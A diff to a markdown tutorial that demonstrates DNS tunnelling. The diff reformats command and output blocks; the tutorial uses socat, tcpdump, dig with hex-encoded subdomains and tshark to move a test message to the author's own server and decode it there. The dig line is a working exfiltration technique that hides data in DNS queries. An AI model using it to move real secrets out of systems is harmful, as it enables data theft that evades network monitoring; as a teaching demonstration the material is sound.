@@ -6,9 +6,8 @@ Remote machine has IP 158.69.60.101 and domain name histfile.org.
 
 On remote machine, we have BIND9 server. It only serves requests from localhost. We temporarily open port 53 to DNS requests, using socat:
 
-```console
-ubuntu@histfile:~$ sudo socat UDP4-LISTEN:53,fork,bind=158.69.60.101 UDP4:127.0.0.1:53 &
-[1] 59852
+```bash
+sudo socat UDP4-LISTEN:53,fork,bind=158.69.60.101 UDP4:127.0.0.1:53 &
 ```
 
 On remote machine, we capture traffic on port 53: [^tcpdump]
@@ -16,7 +15,10 @@ On remote machine, we capture traffic on port 53: [^tcpdump]
 [^tcpdump]: <https://www.tcpdump.org/manpages/tcpdump.1.html>
 
 ```bash
-ubuntu@histfile:~$ sudo tcpdump -i any -w /tmp/dns_capture.pcap 'port 53'
+sudo tcpdump -i any -w /tmp/dns_capture.pcap 'port 53'
+```
+
+```console
 tcpdump: data link type LINUX_SLL2
 tcpdump: listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
 ^C4 packets captured
@@ -26,9 +28,11 @@ tcpdump: listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot leng
 
 On local machine,
 
-```console
-ubuntu@LAPTOP-JBell:~$ dig @histfile.org "$(echo 'my secret message' | xxd -p).covert.histfile.org"
+```bash
+dig @histfile.org "$(echo 'my secret message' | xxd -p).covert.histfile.org"
+```
 
+```console
 ; <<>> DiG 9.18.39-0ubuntu0.24.04.2-Ubuntu <<>> @histfile.org 6d7920736563726574206d6573736167650a.covert.histfile.org
 ; (2 servers found)
 ;; global options: +cmd
@@ -62,7 +66,6 @@ tshark -r /tmp/dns_capture.pcap -T fields -e dns.qry.name \
 ```
 
 ```console
-ubuntu@histfile:~$ tshark -r /tmp/dns_capture.pcap -T fields -e dns.qry.name | grep "covert.histfile.org" | sed 's/\.covert\.histfile\.org\.//' | uniq | xxd -r -p
 my secret message
 ```
 
